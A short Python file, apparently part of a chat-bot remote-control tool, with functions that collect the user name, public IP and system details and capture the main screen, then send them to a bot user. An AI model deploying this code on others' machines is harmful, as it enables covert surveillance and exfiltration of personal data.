import os, requests, platform
import mss
import mss.tools


def pc_info(message, user_id, bot):
    try:
        username = os.getlogin()
        try:
            user_ip = requests.get('https://api.ipify.org?format=raw', timeout=20).text
        except requests.exceptions.RequestException:
            user_ip = "unknown"
        system_name = platform.platform()
        processor = platform.processor()
        os_version = platform.version()
        bot.send_message(user_id,
                         "Name: " + username
                         + "\nIP: " + user_ip
                         + "\nOS: " + system_name
                         + "\nProcessor: " + processor
                         + "\nOS version: " + os_version)
    except:
        bot.send_message(user_id, "An error occurred while trying to get information about the computer")


def get_screenshot(message, user_id, bot):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Use the 1st monitor
        im = sct.grab(monitor)  # Grab the picture
        raw_screenshot = mss.tools.to_png(im.rgb, im.size)
        bot.send_photo(user_id, raw_screenshot)
